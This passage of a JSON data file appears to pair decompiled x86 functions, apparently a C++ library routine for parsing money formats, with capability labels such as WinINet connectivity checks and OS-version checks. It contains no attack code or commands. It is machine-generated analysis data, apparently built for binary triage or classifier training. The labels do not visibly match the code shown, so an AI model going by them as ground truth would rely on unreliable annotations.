        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00402270(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    char *pcVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    int32_t unaff_EBP;\n    int32_t iVar16;\n    char *pcVar17;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_59h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0xb4);\n    iVar11 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0xc0) = *(unaff_EBP + 8);\n    *(unaff_EBP + -100) = 0;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0xb8) = iVar11;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x18);\n    fcn.0040327e(*(*(unaff_EBP + 0x18) + 0x30));\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar5 = fcn.0040540c(unaff_EBP + -0x94);\n        *(unaff_EBP + -0x60) = piVar5;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar5 = fcn.00403409(unaff_EBP + -0x94);\n        *(unaff_EBP + -0x60) = piVar5;\n    }\n    fcn.004050a6();\n    *(unaff_EBP + -0x59) = 0;\n    *(unaff_EBP + -0x5b) = 0;\n    *(unaff_EBP + -0x58) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0xf;\n    *(unaff_EBP + -0x58) = 0;\n    iVar16 = *piVar5;\n    *(unaff_EBP + -4) = 4;\n    pcVar1 = *(iVar16 + 0x2c);\n    (**0x573000)(unaff_EBP + -0x98);\n    (*pcVar1)();\n    puVar2 = *(unaff_EBP + -0x78);\n    *puVar2 = 0;\n    puVar2[4] = 0;\n    puVar2[5] = 0xf;\n    *puVar2 = 0;\n    uVar14 = 1;\n    *(unaff_EBP + -0x70) = 1;\n    uVar6 = *(*(unaff_EBP + -0x88) + 0x30);\n    *(unaff_EBP + -100) = 1;\n    fcn.0040327e(uVar6);\n    *(unaff_EBP + -4) = 6;\n    uVar6 = fcn.004035a8(unaff_EBP + -0xa0);\n    *(unaff_EBP + -4) = 4;\n    *(unaff_EBP + -0x90) = uVar6;\n    fcn.004050a6();\n    fcn.004055ec(\"0123456789-\", 0x54e764, *(unaff_EBP + -0x8c));\n    uVar7 = 0;\n    *(unaff_EBP + -0x84) = 0;\n    do {\n        if (3 < uVar7) {\n            uVar7 = *(unaff_EBP + -0x48);\n            if (uVar7 < 2) goto code_r0x0047f5d5;\n            pcVar17 = unaff_EBP + -0x58;\n            if (0xf < *(unaff_EBP + -0x44)) {\n                pcVar17 = *(unaff_EBP + -0x58);\n            }\n            *(unaff_EBP + -0x5b) = *(unaff_EBP + -0x5b);\n            goto code_r0x0047f56a;\n        }\n        cVar4 = *(unaff_EBP + -0x98 + uVar7);\n        if (cVar4 == ' ') {\ncode_r0x0047f4ce:\n            if (*(unaff_EBP + -0x84) == 3) goto code_r0x0047ecc4;\n            uVar6 = *(unaff_EBP + -0x68);\n            *(unaff_EBP + -0x5a) = 0;\n            cVar4 = fcn.00403f7b(uVar6);\n            if (cVar4 == '\\0') {\n                iVar16 = *(unaff_EBP + -0x90);\n                do {\n                    if (*(iVar11 + 4) == '\\0') {\n                        fcn.004019e7();\n                    }\n                    if ((*(*(iVar16 + 0xc) + *(iVar11 + 5) * 2) & 0x48) == 0) break;\n                    *(unaff_EBP + -0x5a) = 1;\n                    fcn.00401c5d();\n                    cVar4 = fcn.00403f7b(uVar6);\n                } while (cVar4 == '\\0');\n                uVar14 = *(unaff_EBP + -0x70);\n            }\n            if ((*(unaff_EBP + -0x98 + *(unaff_EBP + -0x84)) != ' ') || (*(unaff_EBP + -0x5a) != '\\0'))\n            goto code_r0x0047ecc4;\n            cVar4 = '\\x01';\n            *(unaff_EBP + -0x59) = 1;\n        }\n        else {\n            if (cVar4 == '$') {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x18);\n                (**0x573000)(unaff_EBP + -0x28);\n                (*pcVar1)();\n                uVar14 = uVar14 | 0x80;\n                *(unaff_EBP + -0x70) = uVar14;\n                *(unaff_EBP + -100) = uVar14;\n                uVar6 = *(unaff_EBP + -0x68);\n                *(unaff_EBP + -4) = 7;\n                if (((*(*(unaff_EBP + -0x88) + 0x14) & 8) == 0) && (cVar4 = fcn.00403f7b(uVar6),  cVar4 == '\\0')) {\n                    if (*(iVar11 + 4) == '\\0') {\n                        fcn.004019e7();\n                    }\n                    pcVar17 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        pcVar17 = *(unaff_EBP + -0x28);\n                    }\n                    if (*(iVar11 + 5) == *pcVar17) goto code_r0x0047f408;\ncode_r0x0047f442:\n                    fcn.0040367a(0);\n                }\n                else {\ncode_r0x0047f408:\n                    if ((*(unaff_EBP + -0x84) == 3) && (*(unaff_EBP + -0x48) < 2)) {\n                        cVar4 = fcn.00403f7b(uVar6);\n                        if (cVar4 == '\\0') {\n                            if (*(iVar11 + 4) == '\\0') {\n                                fcn.004019e7();\n                            }\n                            pcVar17 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                pcVar17 = *(unaff_EBP + -0x28);\n                            }\n                            if (*(iVar11 + 5) == *pcVar17) goto code_r0x0047f44c;\n                        }\n                        goto code_r0x0047f442;\n                    }\n                }\ncode_r0x0047f44c:\n                pcVar17 = unaff_EBP + -0x28;\n                if (0xf < *(unaff_EBP + -0x14)) {\n                    pcVar17 = *(unaff_EBP + -0x28);\n                }\n                cVar4 = fcn.00403f7b(*(unaff_EBP + -0x68));\n                if (cVar4 == '\\0') {\n                    uVar6 = *(unaff_EBP + -0x68);\n                    do {\n                        iVar16 = unaff_EBP + -0x28;\n                        if (0xf < *(unaff_EBP + -0x14)) {\n                            iVar16 = *(unaff_EBP + -0x28);\n                        }\n                        if (pcVar17 == *(unaff_EBP + -0x18) + iVar16) break;\n                        if (*(iVar11 + 4) == '\\0') {\n                            fcn.004019e7();\n                        }\n                        if (*(iVar11 + 5) != *pcVar17) break;\n                        pcVar17 = pcVar17 + 1;\n                        fcn.00401c5d();\n                        cVar4 = fcn.00403f7b(uVar6);\n                    } while (cVar4 == '\\0');\n                    uVar14 = *(unaff_EBP + -0x70);\n                }\n                iVar16 = unaff_EBP + -0x28;\n                if (0xf < *(unaff_EBP + -0x14)) {\n                    iVar16 = *(unaff_EBP + -0x28);\n                }\n                if (pcVar17 != *(unaff_EBP + -0x18) + iVar16) {\n                    *(unaff_EBP + -0x59) = 1;\n                }\n                *(unaff_EBP + -4) = 4;\n            }\n            else if (cVar4 == '+') {\n                cVar4 = fcn.00403f7b(*(unaff_EBP + -0x68));\n                if (cVar4 != '\\0') goto code_r0x0047ecc4;\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n                (**0x573000)(unaff_EBP + -0x28);\n                (*pcVar1)();\n                uVar7 = uVar14 | 0x102;\n                *(unaff_EBP + -4) = 8;\n                *(unaff_EBP + -100) = uVar7;\n                if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x0047f16a:\n                    *(unaff_EBP + -0x5a) = 0;\n                }\n                else {\n                    pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n                    (**0x573000)(unaff_EBP + -0x40);\n                    (*pcVar1)();\n                    uVar7 = uVar14 | 0x306;\n                    *(unaff_EBP + -4) = 9;\n                    pcVar17 = unaff_EBP + -0x40;\n                    *(unaff_EBP + -100) = uVar7;\n                    if (0xf < *(unaff_EBP + -0x2c)) {\n                        pcVar17 = *(unaff_EBP + -0x40);\n                    }\n                    if (*(iVar11 + 4) == '\\0') {\n                        fcn.004019e7();\n                    }\n                    cVar4 = *(iVar11 + 5);\n                    *(unaff_EBP + -0x5a) = 1;\n                    if (*pcVar17 != cVar4) goto code_r0x0047f16a;\n                }\n                if ((uVar7 & 4) != 0) {\n                    uVar7 = uVar7 & 0xfffffffb;\n                    *(unaff_EBP + -100) = uVar7;\n                    fcn.004029b9();\n                }\n                *(unaff_EBP + -4) = 4;\n                if ((uVar7 & 2) != 0) {\n                    uVar7 = uVar7 & 0xfffffffd;\n                    *(unaff_EBP + -100) = uVar7;\n                    fcn.004029b9();\n                }\n                if (*(unaff_EBP + -0x5a) == '\\0') {\n                    pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                    (**0x573000)(unaff_EBP + -0x28);\n                    (*pcVar1)();\n                    uVar15 = uVar7 | 0x808;\n                    *(unaff_EBP + -4) = 10;\n                    *(unaff_EBP + -100) = uVar15;\n                    if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x0047f26a:\n                        *(unaff_EBP + -0x5a) = 0;\n                    }\n                    else {\n                        pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                        (**0x573000)(unaff_EBP + -0x40);\n                        (*pcVar1)();\n                        uVar15 = uVar7 | 0x1818;\n                        *(unaff_EBP + -4) = 0xb;\n                        pcVar17 = unaff_EBP + -0x40;\n                        *(unaff_EBP + -100) = uVar15;\n                        if (0xf < *(unaff_EBP + -0x2c)) {\n                            pcVar17 = *(unaff_EBP + -0x40);\n                        }\n                        if (*(iVar11 + 4) == '\\0') {\n                            fcn.004019e7();\n                        }\n                        cVar4 = *(iVar11 + 5);\n                        *(unaff_EBP + -0x5a) = 1;\n                        if (*pcVar17 != cVar4) goto code_r0x0047f26a;\n                    }\n                    if ((uVar15 & 0x10) != 0) {\n                        uVar15 = uVar15 & 0xffffffef;\n                        *(unaff_EBP + -100) = uVar15;\n                        fcn.004029b9();\n                    }\n                    *(unaff_EBP + -4) = 4;\n                    if ((uVar15 & 8) != 0) {\n                        uVar15 = uVar15 & 0xfffffff7;\n                        *(unaff_EBP + -100) = uVar15;\n                        fcn.004029b9();\n                    }\n                    if (*(unaff_EBP + -0x5a) != '\\0') {\n                        fcn.00401c5d();\n                        pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                        (**0x573000)(unaff_EBP + -0x40);\n                        (*pcVar1)();\n                        *(unaff_EBP + -0x9c) = 0;\n                        uVar6 = *(unaff_EBP + -0x9c);\n                        uVar14 = uVar15 | 0x2000;\n                        *(unaff_EBP + -0x70) = uVar14;\n                        *(unaff_EBP + -100) = uVar14;\n                        fcn.00404142(unaff_EBP + -0x40);\n                        fcn.004029b9(unaff_EBP + -0x40, uVar6);\n                        *(unaff_EBP + -0x5b) = 1;\n                        goto code_r0x0047ecc4;\n                    }\n                    pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n                    (**0x573000)(unaff_EBP + -0x28);\n                    (*pcVar1)();\n                    uVar14 = uVar15 | 0x4020;\n                    *(unaff_EBP + -4) = 0xc;\n                    *(unaff_EBP + -0x70) = uVar14;\n                    *(unaff_EBP + -100) = uVar14;\n                    if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x0047f358:\n                        *(unaff_EBP + -0x5a) = 0;\n                    }\n                    else {\n                        pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                        (**0x573000)(unaff_EBP + -0x40);\n                        (*pcVar1)();\n                        uVar14 = uVar15 | 0xc060;\n                        *(unaff_EBP + -0x5a) = 1;\n                        *(unaff_EBP + -0x70) = uVar14;\n                        *(unaff_EBP + -100) = uVar14;\n                        if (*(unaff_EBP + -0x30) != 0) goto code_r0x0047f358;\n                    }\n                    if ((uVar14 & 0x40) != 0) {\n                        uVar14 = uVar14 & 0xffffffbf;\n                        *(unaff_EBP + -0x70) = uVar14;\n                        *(unaff_EBP + -100) = uVar14;\n                        fcn.004029b9();\n                    }\n                    *(unaff_EBP + -4) = 4;\n                    if ((uVar14 & 0x20) != 0) {\n                        uVar14 = uVar14 & 0xffffffdf;\n                        *(unaff_EBP + -0x70) = uVar14;\n                        *(unaff_EBP + -100) = uVar14;\n                        fcn.004029b9();\n                    }\n                    cVar4 = *(unaff_EBP + -0x59);\n                    if (*(unaff_EBP + -0x5a) != '\\0') {\n                        *(unaff_EBP + -0x5b) = 1;\n                    }\n                    goto code_r0x0047ecc7;\n                }\n                fcn.00401c5d();\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                *(unaff_EBP + -0xbc) = 0;\n                uVar14 = uVar7 | 0x400;\n                *(unaff_EBP + -0x70) = uVar14;\n                *(unaff_EBP + -100) = uVar14;\n                fcn.00404142(unaff_EBP + -0x40);\n            }\n            else {\n                if (cVar4 != 'v') {\n                    if (cVar4 == 'x') goto code_r0x0047f4ce;\n                    goto code_r0x0047ecc4;\n                }\n                piVar5 = *(unaff_EBP + -0x60);\n                *(unaff_EBP + -0x7c) = 0;\n                uVar6 = fcn.00405f6f();\n                *(unaff_EBP + -0x80) = uVar6;\n                pcVar1 = *(*piVar5 + 0x14);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar14 = uVar14 | 0x10000;\n                *(unaff_EBP + -0x70) = uVar14;\n                *(unaff_EBP + -100) = uVar14;\n                *(unaff_EBP + -4) = 0xd;\n                if (*(unaff_EBP + -0x30) == 0) {\ncode_r0x0047f013:\n                    uVar6 = *(unaff_EBP + -0x68);\n                    cVar4 = fcn.00403f7b(uVar6);\n                    if (cVar4 == '\\0') {\n                        do {\n                            if (*(iVar11 + 4) == '\\0') {\n                                fcn.004019e7();\n                            }\n                            *(unaff_EBP + -0xa8) = *(iVar11 + 5);\n                            uVar7 = fcn.004053df(*(unaff_EBP + -0x8c), *(unaff_EBP + -0xa8));\n                            if (9 < uVar7) break;\n                            *(unaff_EBP + -0xac) = \"0123456789-\"[uVar7];\n                            fcn.00404476(*(unaff_EBP + -0xac));\n                            fcn.00401c5d();\n                            cVar4 = fcn.00403f7b(uVar6);\n                        } while (cVar4 == '\\0');\n                        uVar14 = *(unaff_EBP + -0x70);\n                    }\ncode_r0x0047ef50:\n                    uVar3 = fcn.00405b64();\n                    *(unaff_EBP + -0x5a) = uVar3;\n                    cVar4 = fcn.00403f7b(uVar6);\n                    if ((cVar4 == '\\0') && (*(unaff_EBP + -0x5a) != '\\0')) {\n                        if (*(iVar11 + 4) == '\\0') {\n                            fcn.004019e7();\n                        }\n                        if (*(iVar11 + 5) != *(unaff_EBP + -0x5a)) goto code_r0x0047f09a;\n                        fcn.00401c5d();\n                        cVar4 = fcn.00403f7b(uVar6);\n                        iVar16 = *(unaff_EBP + -0x80);\n                        while (iVar10 = *(unaff_EBP + -0x7c),  cVar4 == '\\0') {\n                            if (iVar16 <= iVar10) goto code_r0x0047f0a0;\n                            if (*(iVar11 + 4) == '\\0') {\n                                fcn.004019e7();\n                            }\n                            *(unaff_EBP + -0xb0) = *(iVar11 + 5);\n                            uVar7 = fcn.004053df(*(unaff_EBP + -0x8c), *(unaff_EBP + -0xb0));\n                            if (9 < uVar7) {\n                                iVar10 = *(unaff_EBP + -0x7c);\n                                goto code_r0x0047f094;\n                            }\n                            *(unaff_EBP + -0xb4) = \"0123456789-\"[uVar7];\n                            fcn.00404476(*(unaff_EBP + -0xb4));\n                            *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x7c) + 1;\n                            fcn.00401c5d();\n                            cVar4 = fcn.00403f7b(*(unaff_EBP + -0x68));\n                        }\n                        if (iVar10 < iVar16) {\ncode_r0x0047f094:\n                            *(unaff_EBP + -0x59) = 1;\n                        }\n                    }\n                    else {\ncode_r0x0047f09a:\n                        iVar16 = *(unaff_EBP + -0x80);\n                        iVar10 = *(unaff_EBP + -0x7c);\n                    }\ncode_r0x0047f0a0:\n                    if (*(*(unaff_EBP + -0x78) + 0x10) == 0) {\n                        *(unaff_EBP + -0x59) = 1;\n                    }\n                    else if (iVar10 < iVar16) {\n                        iVar16 = iVar16 - iVar10;\n                        do {\n                            fcn.00404476(0x30);\n                            iVar16 = iVar16 + -1;\n                        } while (iVar16 != 0);\n                        iVar11 = *(unaff_EBP + -0xb8);\n                    }\n                }\n                else {\n                    cVar4 = fcn.00402a90();\n                    *(unaff_EBP + -0x5a) = cVar4;\n                    if (cVar4 == '\\0') goto code_r0x0047f013;\n                    puVar8 = unaff_EBP + -0x40;\n                    if (0xf < *(unaff_EBP + -0x2c)) {\n                        puVar8 = *(unaff_EBP + -0x40);\n                    }\n                    if (0x7e < *puVar8) goto code_r0x0047f013;\n                    *(unaff_EBP + -0x28) = 0;\n                    *(unaff_EBP + -0x18) = 0;\n                    *(unaff_EBP + -0x14) = 0xf;\n                    *(unaff_EBP + -0x28) = 0;\n                    *(unaff_EBP + -4) = 0xf;\n                    fcn.00404476(0);\n                    iVar16 = 0;\n                    uVar7 = fcn.00403f7b(*(unaff_EBP + -0x68));\n                    if (uVar7 == '\\0') {\n                        iVar10 = *(unaff_EBP + -0x28);\n                        *(unaff_EBP + -0x6c) = iVar10;\n                        do {\n                            if (*(iVar11 + 4) == '\\0') {\n                                uVar7 = fcn.004019e7();\n                            }\n                            uVar7 = uVar7 & 0xffffff00 | *(iVar11 + 5);\n                            *(unaff_EBP + -0x74) = uVar7;\n                            uVar7 = fcn.004053df(*(unaff_EBP + -0x8c), uVar7);\n                            if (uVar7 < 10) {\n                                *(unaff_EBP + -0xa4) = \"0123456789-\"[uVar7];\n                                fcn.00404476(*(unaff_EBP + -0xa4));\n                                iVar9 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    iVar9 = iVar10;\n                                }\n                                if (*(iVar9 + iVar16) != '\\x7f') {\n                                    iVar9 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        iVar9 = iVar10;\n                                    }\n                                    *(iVar9 + iVar16) = *(iVar9 + iVar16) + '\\x01';\n                                    goto code_r0x0047ee1c;\n                                }\n                            }\n                            else {\n                                iVar9 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    iVar9 = iVar10;\n                                }\n                                if (*(iVar9 + iVar16) == '\\0') break;\n                                if (*(iVar11 + 4) == '\\0') {\n                                    fcn.004019e7();\n                                    cVar4 = *(iVar11 + 5);\n                                }\n                                else {\n                                    cVar4 = *(unaff_EBP + -0x74);\n                                }\n                                if (cVar4 != *(unaff_EBP + -0x5a)) break;\n                                fcn.00404476(0);\n                                iVar16 = iVar16 + 1;\ncode_r0x0047ee1c:\n                                iVar10 = *(unaff_EBP + -0x28);\n                                *(unaff_EBP + -0x6c) = iVar10;\n                            }\n                            fcn.00401c5d();\n                            uVar7 = fcn.00403f7b(*(unaff_EBP + -0x68));\n                        } while (uVar7 == '\\0');\n                        uVar14 = *(unaff_EBP + -0x70);\n                        if (iVar16 == 0) {\n                            pcVar17 = *(unaff_EBP + -0x6c);\n                            goto code_r0x0047ee69;\n                        }\n                        iVar10 = unaff_EBP + -0x28;\n                        if (0xf < *(unaff_EBP + -0x14)) {\n                            iVar10 = *(unaff_EBP + -0x6c);\n                        }\n                        pcVar17 = *(unaff_EBP + -0x6c);\n                        if ('\\0' < *(iVar10 + iVar16)) {\n                            iVar16 = iVar16 + 1;\n                            goto code_r0x0047ee69;\n                        }\n                        cVar4 = '\\x01';\n                        *(unaff_EBP + -0x59) = 1;\n                    }\n                    else {\n                        pcVar17 = *(unaff_EBP + -0x28);\ncode_r0x0047ee69:\n                        cVar4 = *(unaff_EBP + -0x59);\n                    }\n                    pcVar13 = unaff_EBP + -0x40;\n                    *(unaff_EBP + -0x6c) = pcVar13;\n                    if (0xf < *(unaff_EBP + -0x2c)) {\n                        pcVar13 = *(unaff_EBP + -0x40);\n                        *(unaff_EBP + -0x6c) = pcVar13;\n                    }\n                    if (cVar4 == '\\0') {\n                        while ((iVar16 != 0 && (cVar4 = *pcVar13,  cVar4 != '\\x7f'))) {\n                            iVar16 = iVar16 + -1;\n                            if (iVar16 != 0) {\n                                pcVar13 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    pcVar13 = pcVar17;\n                                }\n                                if (cVar4 == pcVar13[iVar16]) goto code_r0x0047eeaa;\ncode_r0x0047eecc:\n                                *(unaff_EBP + -0x59) = 1;\n                                goto code_r0x0047eed0;\n                            }\ncode_r0x0047eeaa:\n                            if (iVar16 == 0) {\n                                pcVar13 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    pcVar13 = pcVar17;\n                                }\n                                if (cVar4 < *pcVar13) goto code_r0x0047eecc;\n                            }\n                            pcVar13 = *(unaff_EBP + -0x6c);\n                            if ('\\0' < pcVar13[1]) {\n                                pcVar13 = pcVar13 + 1;\n                                *(unaff_EBP + -0x6c) = pcVar13;\n                            }\n                        }\n                        *(unaff_EBP + -4) = 0xd;\n                        if (0xf < *(unaff_EBP + -0x14)) {\n                            uVar7 = *(unaff_EBP + -0x14) + 1;\n                            *(unaff_EBP + -0x74) = pcVar17;\n                            *(unaff_EBP + -0x6c) = uVar7;\n                            if (0xfff < uVar7) {\n                                fcn.00404070(unaff_EBP + -0x74, unaff_EBP + -0x6c);\n                                pcVar17 = *(unaff_EBP + -0x74);\n                            }\n                            fcn.00401a32(pcVar17);\n                        }\n                        uVar6 = *(unaff_EBP + -0x68);\n                        goto code_r0x0047ef50;\n                    }\ncode_r0x0047eed0:\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        uVar7 = *(unaff_EBP + -0x14) + 1;\n                        *(unaff_EBP + -0x80) = pcVar17;\n                        *(unaff_EBP + -0x74) = uVar7;\n                        if (0xfff < uVar7) {\n                            fcn.00404070(unaff_EBP + -0x80, unaff_EBP + -0x74);\n                            pcVar17 = *(unaff_EBP + -0x80);\n                        }\n                        fcn.00401a32(pcVar17);\n                    }\n                }\n                *(unaff_EBP + -4) = 4;\n            }\n            fcn.004029b9();\ncode_r0x0047ecc4:\n            cVar4 = *(unaff_EBP + -0x59);\n        }\ncode_r0x0047ecc7:\n        *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + 1;\n        uVar7 = *(unaff_EBP + -0x84);\n    } while (cVar4 == '\\0');\n    goto code_r0x0047f5bf;\ncode_r0x0047f56a:\n    pcVar17 = pcVar17 + 1;\n    iVar16 = unaff_EBP + -0x58;\n    if (0xf < *(unaff_EBP + -0x44)) {\n        iVar16 = *(unaff_EBP + -0x58);\n    }\n    if (pcVar17 == iVar16 + uVar7) goto code_r0x0047f5ad;\n    cVar4 = fcn.00403f7b(*(unaff_EBP + -0x68));\n    if (cVar4 != '\\0') goto code_r0x0047f5aa;\n    if (*(iVar11 + 4) == '\\0') {\n        fcn.004019e7();\n    }\n    if (*(iVar11 + 5) != *pcVar17) goto code_r0x0047f5aa;\n    fcn.00401c5d();\n    uVar7 = *(unaff_EBP + -0x48);\n    goto code_r0x0047f56a;\ncode_r0x0047f5aa:\n    uVar7 = *(unaff_EBP + -0x48);\ncode_r0x0047f5ad:\n    iVar11 = unaff_EBP + -0x58;\n    if (0xf < *(unaff_EBP + -0x44)) {\n        iVar11 = *(unaff_EBP + -0x58);\n    }\n    if (pcVar17 == iVar11 + uVar7) {\ncode_r0x0047f5d5:\n        if (*(unaff_EBP + -0x5b) != '\\0') {\n            fcn.00405736(0, 1, 0x2d);\n        }\n        goto code_r0x0047f5eb;\n    }\ncode_r0x0047f5bf:\n    puVar2 = *(unaff_EBP + -0x78);\n    puVar12 = puVar2;\n    if (0xf < puVar2[5]) {\n        puVar12 = *puVar2;\n    }\n    puVar2[4] = 0;\n    *puVar12 = 0;\ncode_r0x0047f5eb:\n    if (0xf < *(unaff_EBP + -0x44)) {\n        uVar6 = *(unaff_EBP + -0x58);\n        uVar7 = *(unaff_EBP + -0x44) + 1;\n        *(unaff_EBP + -0x88) = uVar7;\n        *(unaff_EBP + -0x74) = uVar6;\n        if (0xfff < uVar7) {\n            fcn.00404070(unaff_EBP + -0x74, unaff_EBP + -0x88);\n            uVar6 = *(unaff_EBP + -0x74);\n        }\n        fcn.00401a32(uVar6);\n    }\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 8327
    },
    "0040231a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040231a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    ushort *puVar12;\n    int32_t iVar13;\n    uint *puVar14;\n    char *arg_8h_00;\n    char *pcVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    int32_t unaff_EBP;\n    int32_t iVar18;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_59h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0xa8);\n    iVar13 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + 8);\n    *(unaff_EBP + -100) = 0;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0xac) = iVar13;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x18);\n    fcn.0040327e(*(*(unaff_EBP + 0x18) + 0x30));\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar5 = fcn.00403fd0(unaff_EBP + -0x90);\n        *(unaff_EBP + -0x60) = piVar5;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar5 = fcn.00405173(unaff_EBP + -0x90);\n        *(unaff_EBP + -0x60) = piVar5;\n    }\n    fcn.004050a6();\n    *(unaff_EBP + -0x59) = 0;\n    *(unaff_EBP + -0x5b) = 0;\n    *(unaff_EBP + -0x58) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 7;\n    *(unaff_EBP + -0x58) = 0;\n    iVar18 = *piVar5;\n    *(unaff_EBP + -4) = 4;\n    pcVar1 = *(iVar18 + 0x2c);\n    (**0x573000)(unaff_EBP + -0x9c);\n    (*pcVar1)();\n    puVar2 = *(unaff_EBP + -0x78);\n    *puVar2 = 0;\n    puVar2[4] = 0;\n    puVar2[5] = 0xf;\n    *puVar2 = 0;\n    uVar16 = 1;\n    *(unaff_EBP + -0x70) = 1;\n    uVar7 = *(*(unaff_EBP + -0x88) + 0x30);\n    *(unaff_EBP + -100) = 1;\n    fcn.0040327e(uVar7);\n    *(unaff_EBP + -4) = 6;\n    piVar5 = fcn.0040342c(unaff_EBP + -0x90);\n    *(unaff_EBP + -4) = 4;\n    *(unaff_EBP + -0x98) = piVar5;\n    fcn.004050a6();\n    var_14h = 0x54e45c;\n    fcn.00402bdf(0x54e450, 0x54e45c, *(unaff_EBP + -0x94));\n    uVar6 = 0;\n    *(unaff_EBP + -0x84) = 0;\n    do {\n        if (3 < uVar6) {\n            uVar6 = *(unaff_EBP + -0x48);\n            if (uVar6 < 2) goto code_r0x004729d4;\n            piVar11 = unaff_EBP + -0x58;\n            if (7 < *(unaff_EBP + -0x44)) {\n                piVar11 = *(unaff_EBP + -0x58);\n            }\n            *(unaff_EBP + -0x5b) = *(unaff_EBP + -0x5b);\n            goto code_r0x00472963;\n        }\n        cVar3 = *(unaff_EBP + -0x9c + uVar6);\n        